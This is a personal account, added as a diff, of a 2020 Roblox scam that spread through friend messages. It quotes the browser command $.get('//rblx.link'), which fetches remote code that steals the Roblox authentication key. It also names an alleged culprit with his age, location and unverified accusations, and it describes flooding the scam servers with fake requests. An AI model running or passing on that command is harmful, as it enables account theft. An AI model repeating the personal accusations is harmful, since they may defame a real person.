@@ -1,0 +1,75 @@
+On January 28th, 2020, I decided to visit the Roblox.com
+website, to check up on things a bit. I saw that I was sent a message
+by a Roblox friend, asking me a harmless question.
+
+hi dude
+i'm making a game and I wanna put your roblox character into it
+could you upload your roblox char texture as a decal and send the link to me
+here's a tutorial on how to do it if you don't already know:
+
+They linked me to a Youtube tutorial, and I was instantly suspicious
+of a scam. On the Youtube video, I was prompted to run javascript
+in my browser.
+
+$.get('//rblx.link')
+
+"rblx.link" runs remote code from a third party website.
+That code gets your Roblox authentication key and sends it to their
+server, and then sends you to the profile texture as expected.
+
+When I clicked on my friends profile, they were wearing red and blue
+Roblox clothes, and the description was changed to:
+
+Ask your parents to vote for Trump this year!
+#MAGA2020
+
+After studying how the fraud works for a few days, I came up with a clear
+explaination of how it works:
+
+When an account is hacked, their robux is stolen, and account is filled with
+Trump propoganda. They the system messages all their friends, sending the same 
+message, therefore, the number of hacked accounts grows exponentially.
+
+The domain they use is "rblx.link". I tracked the hosting providor to
+DigitalOcean, and they quickly removed it, breaking the entire system.
+
+That lasted seven hours.
+
+After their host was down, they quickly relocated
+to a lesser-known Netherlands based host and changed the description of the
+video to a new port on the same site. 
+I then returned by reporting the abusive website to the new host.
+
+The actual video itself seemed of no value as it was a scam tutorial, but they actually
+blantanly give out their username and the amount of Robux they currently own ($2.8k worth). 
+Visiting his profile, "jordy240797", he gives us his name, "Jordy", his age, 22, and where he lives,
+the Netherlands.
+
+There was existing research done on this person,
+exposing messages that show that he is a sexual predator, and scammer and
+has a history of stealing other people's work and labeling it as their own.
+
+There may or may not be a connection between their location and their choice in hosting
+providers. They chose DigitalOcean, then Clouvider Limited. As Clouvider limited is a Netherlandic
+based hosting service, they could easily be connnected.
+
+The video could also be faked, but the connection is still strong.
+
+After searching more, I figured out it wasn't just one site, but many. There
+are even tutorials on Youtube showing you how to set it up, and showing
+me behind the scenes on how it works.
+
+In an effort to try and slow down the efficiency of their systems, I wrote
+a script to generate fake requests and send them to these server. This
+will confuse the real and fake requests, therefore drastically slowing down the 
+breaking-into-accounts process.
+
+I found a few servers to spam, and proceeded to send hundreds, and sometimes thousands
+of fake requests to them.
+
+
+Resources:
+https://twitter.com/JordyRBX/with_replies?lang=en
+https://murder-mystery-2.fandom.com/wiki/Jordy240797
+https://www.roblox.com/users/6104912/profile
+https://docs.google.com/document/u/1/d/19GpwqJCRxm7S3_J8mCqMFxmTynIEEGY8c5w5YvLP8aQ/mobilebasic
